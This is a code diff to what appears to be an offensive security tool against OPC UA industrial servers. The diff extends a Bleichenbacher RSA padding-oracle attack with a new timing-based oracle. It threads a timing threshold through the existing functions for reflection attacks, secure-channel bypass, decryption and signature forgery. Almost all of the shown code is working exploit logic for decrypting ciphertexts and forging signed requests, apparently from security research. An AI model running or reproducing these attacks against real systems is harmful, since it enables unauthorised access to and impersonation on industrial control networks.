@@ -18,7 +18,7 @@ from pathlib import Path
 from decimal import Decimal
 from io import BytesIO
 
-import sys, os, itertools, re, math, hashlib, json
+import sys, os, itertools, re, math, hashlib, json, time
 
 # Logging and errors.
 def log(msg : str):
@@ -425,7 +425,7 @@ def demonstrate_access(chan : ChannelState | str, authToken : NodeId, policy : S
   log('Finished browsing.') 
 
 # Reflection attack: log in to a server with its own identity.
-def reflect_attack(url : str, demo : bool, try_opn_oracle : bool, try_password_oracle : bool, cache_file : Path):
+def reflect_attack(url : str, demo : bool, try_opn_oracle : bool, try_password_oracle : bool, cache_file : Path, timing_threshold : float):
   proto, host, port = parse_endpoint_url(url)
   log(f'Attempting reflection attack against {url}')
   endpoints = get_endpoints(url)
@@ -451,7 +451,7 @@ def reflect_attack(url : str, demo : bool, try_opn_oracle : bool, try_password_o
       assert tproto == TransportProtocol.TCP_BINARY
       
       log(f'No HTTPS endpoints. Trying to bypass secure channel on {target.endpointUrl} via padding oracle.')
-      chan = bypass_opn(target, target, try_opn_oracle, try_password_oracle, cache_file)
+      chan = bypass_opn(target, target, try_opn_oracle, try_password_oracle, cache_file, timing_threshold)
       log(f'Trying reflection attack (if channel is still alive).')
       try:
         token = execute_relay_attack(chan, target, chan, target)
@@ -550,8 +550,8 @@ class PaddingOracle(ABC):
       except KeyboardInterrupt as ex:
         # Don't retry when user CTRL+C's.
         raise ex
-      except TimeoutError:
-        # Stop reusing connections once a timeout has happened once.
+      except (TimeoutError, ConnectionResetError):
+        # Stop reusing connections once a timeout or connection reset has happened once.
         self._has_timed_out = True
       except:
         # On any misc. exception, assume the connection is broken and reset it.
@@ -563,6 +563,10 @@ class PaddingOracle(ABC):
     self._setup()
     self._active = True
     return self._attempt_query(ciphertext)
+    
+# For some reason, one implementation leaves the TCP connection open after failure but stops responding. Put a
+# timeout on the socket (kinda arbitrarily picked 3 seconds) to cause a breaking exception when this happens.
+PO_SOCKET_TIMEOUT = 3
     
 class OPNPaddingOracle(PaddingOracle):
   def _setup(self):
@@ -577,9 +581,7 @@ class OPNPaddingOracle(PaddingOracle):
       encodedPart=b''
     )
     
-    # For some reason, one implementation leaves the TCP connection open after failure but stops responding. Put a
-    # timeout on the socket (kinda arbitrarily picked 3 seconds) to cause a breaking exception when this happens.
-    self._socket.settimeout(3)
+    self._socket.settimeout(PO_SOCKET_TIMEOUT)
     
   def _cleanup(self):
    self._socket.shutdown(SHUT_RDWR)
@@ -703,6 +705,75 @@ class PasswordPaddingOracle(PaddingOracle):
         ep.transportProfileUri.endswith('uatcp-uasc-uabinary')
       )
     )
+    
+class TimingBasedPaddingOracle(PaddingOracle):
+  def __init__(self, 
+    endpoint, 
+    base_oracle : PaddingOracle,    # Padding oracle technique to use for timing when False is returned.
+    timing_threshold : float = 0.5, # When processing takes longer than this many seconds, asumming correct padding.
+    verify_repeats : int = 5,       # How many times to repeat 'slow' query before confidence that padding is correct.
+    ctext_expansion : int = 100     # How many times bigger to repeat the ciphertext
+  ):
+    super().__init__(endpoint)
+    self._base = base_oracle
+    self._threshold = timing_threshold
+    self._repeats = verify_repeats
+    self._expansion = ctext_expansion
+  
+  def _setup(self):
+    # To improve reliability, repeat setup for every single attempt.
+    pass
+    
+  def _cleanup(self):
+   pass
+   
+  def _attempt_query(self, ciphertext):
+    self._base._setup()
+    payload = ciphertext * self._expansion
+    try:
+      start = time.time()
+      retval = self._base._attempt_query(payload)
+      duration = time.time() - start
+    except TimeoutError:
+      retval = False
+      duration = PO_SOCKET_TIMEOUT
+      
+    try:
+      self._base._cleanup()
+    except:
+      pass
+      
+    if retval:
+      # Apperantly no timing is needed for this one. Edge case that can occur on initial ciphertext.
+      return True
+    elif duration > self._threshold:
+      # Padding seems correct. Repeat with clean connections to gain certainty.
+      for i in range(0, self._repeats):
+        self._base._setup()
+        try:
+          start = time.time()
+          self._base._attempt_query(payload)
+          duration = time.time() - start
+        except TimeoutError:
+          duration = PO_SOCKET_TIMEOUT
+          
+        try:
+          self._base._cleanup()
+        except:
+          pass
+          
+        if duration < self._threshold:
+          return False
+       
+      # Padding must be right!
+      return True
+    else:
+      return False
+        
+      
+  @classmethod
+  def pick_endpoint(clazz, endpoints):
+    raise Exception('Call this on base oracle.')
 
 # Carry out a padding oracle attack against a Basic128Rsa15 endpoint.
 # Result is ciphertext**d mod n (encoded big endian; any padding not removed).
@@ -812,7 +883,7 @@ def rsa_decryptor(oracle : PaddingOracle, certificate : bytes, ciphertext : byte
     i += 1
   
   
-def padding_oracle_quality(certificate : bytes, oracle : PaddingOracle) -> int:
+def padding_oracle_quality(certificate : bytes, oracle : PaddingOracle, goodpads : int = 100, badpads : int = 100) -> int:
   # Gives a score between 0 and 100 on how "strong" the padding oracle is.
   # This is determined by encrypting testing 100 plaintexts with correct padding and 100 with incorrect padding.
   # The score is based on the number of correct padding correctly reported as such is returned.
@@ -824,12 +895,11 @@ def padding_oracle_quality(certificate : bytes, oracle : PaddingOracle) -> int:
   n, e = certificate_publickey_numbers(certificate)
   
   # Generate test cases deterministically for consistent scoring.
-  TESTCOUNT = 100
   TESTSEED = 0x424242
   rng = Random(TESTSEED)
   
   # For 'correct' test cases. First pick random padding size and then randomize both padding and data.
-  datasizes = [rng.randint(0, keylen - 11) for _ in range(0, TESTCOUNT)]
+  datasizes = [rng.randint(0, keylen - 11) for _ in range(0, goodpads)]
   padvals = [sum(rng.randint(1,255) << (i * 8) for i in range(0, keylen - ds - 3)) for ds in datasizes]
   correctpadding = [
     (2 << 8 * (keylen - 2)) + \
@@ -839,8 +909,8 @@ def padding_oracle_quality(certificate : bytes, oracle : PaddingOracle) -> int:
   ]
   
   # As incorrect padding, just pick uniform random numbers modulo n not starting with 0x0002.
-  wrongpadding = [rng.randint(1, n) for _ in range(0, TESTCOUNT)]
-  for i in range(0, TESTCOUNT):
+  wrongpadding = [rng.randint(1, n) for _ in range(0, badpads)]
+  for i in range(0, badpads):
     while wrongpadding[i] >> (8 * (keylen - 2)) == 2:
       wrongpadding[i] = rng.randint(1, n)
   
@@ -860,14 +930,12 @@ def padding_oracle_quality(certificate : bytes, oracle : PaddingOracle) -> int:
       else:
         # Our Bleichenbacher attack can't deal with false negatives.
         return 0
-    # elif padding_right:
-    #   print(f'Missed {hexlify(int2bytes(plaintext, keylen))}')
   
   print(f'[*] Progress: [{"=" * 100}]', file=sys.stderr, flush=True)
-  return score
+  return score * 100 // goodpads
 
 
-def find_padding_oracle(url : str, try_opn : bool, try_password : bool) -> tuple[PaddingOracle, endpointDescription.Type]:
+def find_padding_oracle(url : str, try_opn : bool, try_password : bool, timing_threshold : float) -> tuple[PaddingOracle, endpointDescription.Type]:
   # Try finding a working padding oracle against an endpoint.
   assert try_opn or try_password
   endpoints = get_endpoints(url)
@@ -895,9 +963,18 @@ def find_padding_oracle(url : str, try_opn : bool, try_password : bool) -> tuple
           return oracle
         elif quality > bestscore:
           bestname, bestep, bestoracle, bestscore = oname, endpoint, oracle, quality
+        elif quality == 0 and timing_threshold > 0:
+          log(f'Base {oname} not working. Testing timing-based variant (threshold: {timing_threshold} seconds); this can take a minute.')
+          toracle = TimingBasedPaddingOracle(endpoint, oclass(endpoint), timing_threshold)
+          quality = padding_oracle_quality(endpoint.serverCertificate, toracle, 10, 100)
+          log(f'Timing-based {oname} score: {quality}/100')
+          # Prefer non-timing oracles with equal quality.
+          quality -= 1
+          if quality > bestscore:
+            bestname, bestep, bestoracle, bestscore = f'Timing-based {oname}', endpoint, toracle, quality
           
       except ServerError as err:
-        log(f'Got server error {hex(err.errorcode)}. Don\'t know how to interpret it. Skipping {oname} oracle.')
+        log(f'Got server error {hex(err.errorcode)} ("{err.reason}"). Don\'t know how to interpret it. Skipping {oname} oracle.')
       except Exception as ex:
         log(f'Exception {type(ex).__name__} raised ("{ex}"). Skipping {oname} oracle.')
     else:
@@ -909,11 +986,11 @@ def find_padding_oracle(url : str, try_opn : bool, try_password : bool) -> tuple
   else:
     raise AttackNotPossible(f'Can\'t find exploitable padding oracle.')
 
-def decrypt_attack(url : str, ciphertext : bytes, try_opn : bool, try_password : bool):
+def decrypt_attack(url : str, ciphertext : bytes, try_opn : bool, try_password : bool, timing_threshold : float):
   # Use padding oracle to decrypt a ciphertext.
   # Logs the result, and also tries parsing it.
   
-  oracle, endpoint = find_padding_oracle(url, try_opn, try_password)
+  oracle, endpoint = find_padding_oracle(url, try_opn, try_password, timing_threshold)
   
   log(f'Running padding oracle attack...')
   result = rsa_decryptor(oracle, endpoint.serverCertificate, ciphertext)
@@ -966,7 +1043,7 @@ def decrypt_attack(url : str, ciphertext : bytes, try_opn : bool, try_password :
       except:
         pass
 
-def forge_signature_attack(url : str, payload : bytes, try_opn : bool, try_password : bool, policy : SecurityPolicy) -> bytes:
+def forge_signature_attack(url : str, payload : bytes, try_opn : bool, try_password : bool, policy : SecurityPolicy, timing_threshold : float) -> bytes:
   # Use padding oracle to forge an RSA PKCS#1 signature on some arbitrary payload.
   # Logs and returns signature.
   
@@ -975,8 +1052,7 @@ def forge_signature_attack(url : str, payload : bytes, try_opn : bool, try_passw
     raise AttackNotPossible('Spoofing PSS signature is possible but currently not yet implemented.')
   
   hasher = 'sha1' if policy == SecurityPolicy.BASIC128RSA15 else 'sha256'
-  oracle, endpoint = find_padding_oracle(url, try_opn, try_password)
-  
+  oracle, endpoint = find_padding_oracle(url, try_opn, try_password, timing_threshold)  
   # Compute padded hash to be used as 'ciphertext'.
   sigsize = certificate_publickey(endpoint.serverCertificate).size_in_bytes()
   padhash = pkcs1v15_signature_encode(hasher, payload, sigsize)
@@ -1072,7 +1148,7 @@ def inject_cn_attack(url : str, cn : str, second_login : bool, demo : bool):
     demonstrate_access(*chantoken, ep.securityPolicyUri)
     
 
-def forge_opn_request(impersonate_endpoint : endpointDescription.Type, login_endpoint : endpointDescription.Type, opn_oracle : bool, password_oracle : bool) -> OpenSecureChannelMessage:
+def forge_opn_request(impersonate_endpoint : endpointDescription.Type, login_endpoint : endpointDescription.Type, opn_oracle : bool, password_oracle : bool, timing_threshold : float) -> OpenSecureChannelMessage:
   # Use the padding oracle attack (against impersonate_endpoint) to forge a reusable signed and encrypted OPN request, that can be used against login_endpoint.  
   assert login_endpoint.securityPolicyUri != SecurityPolicy.NONE
   
@@ -1101,7 +1177,7 @@ def forge_opn_request(impersonate_endpoint : endpointDescription.Type, login_end
   login_pk = certificate_publickey(login_endpoint.serverCertificate)
   login_sp = login_endpoint.securityPolicyUri
   msg.sign_and_encrypt(
-    signer=lambda data: forge_signature_attack(impersonate_endpoint.endpointUrl, data, opn_oracle, password_oracle, login_sp),
+    signer=lambda data: forge_signature_attack(impersonate_endpoint.endpointUrl, data, opn_oracle, password_oracle, login_sp, timing_threshold),
     encrypter=lambda ptext: rsa_ecb_encrypt(login_sp, login_pk, ptext),
     plainblocksize=rsa_plainblocksize(login_sp, login_pk),
     cipherblocksize=login_pk.size_in_bytes(),
@@ -1111,7 +1187,7 @@ def forge_opn_request(impersonate_endpoint : endpointDescription.Type, login_end
   log(f'Message bytes after applying encryption: {hexlify(msg.to_bytes()).decode()}')
   return msg
   
-def bypass_opn(impersonate_endpoint : endpointDescription.Type, login_endpoint : endpointDescription.Type, opn_oracle : bool, password_oracle : bool, cache : Path) -> ChannelState:
+def bypass_opn(impersonate_endpoint : endpointDescription.Type, login_endpoint : endpointDescription.Type, opn_oracle : bool, password_oracle : bool, cache : Path, timing_threshold : float) -> ChannelState:
   lproto, lhost, lport = parse_endpoint_url(login_endpoint.endpointUrl)
   if lproto != TransportProtocol.TCP_BINARY:
     raise AttackNotPossible('Target endpoint should use opc.tcp protocol.')
@@ -1133,7 +1209,7 @@ def bypass_opn(impersonate_endpoint : endpointDescription.Type, login_endpoint :
     opn_req = OpenSecureChannelMessage()
     opn_req.from_bytes(BytesIO(b64decode(cachedata[cachekey])))
   else:
-    opn_req = forge_opn_request(impersonate_endpoint, login_endpoint, opn_oracle, password_oracle)
+    opn_req = forge_opn_request(impersonate_endpoint, login_endpoint, opn_oracle, password_oracle, timing_threshold)
     log(f'Storing signed+encrypted OPN request in cache file {cache}.')
     cachedata[cachekey] = b64encode(opn_req.to_bytes()).decode()
     with cache.open('w') as outfile:
@@ -1144,7 +1220,7 @@ def bypass_opn(impersonate_endpoint : endpointDescription.Type, login_endpoint :
   opn_reply = opc_exchange(login_sock, opn_req)
   
   log_success('Forged OPN request was accepted. Now keeping this session open while decrypting the first block of the response.')
-  oracle, oracle_ep = find_padding_oracle(impersonate_endpoint.endpointUrl, opn_oracle, password_oracle)
+  oracle, oracle_ep = find_padding_oracle(impersonate_endpoint.endpointUrl, opn_oracle, password_oracle, timing_threshold)
   cipherblocksize = certificate_publickey(oracle_ep.serverCertificate).size_in_bytes()
   assert len(opn_reply.encodedPart) % cipherblocksize == 0
   
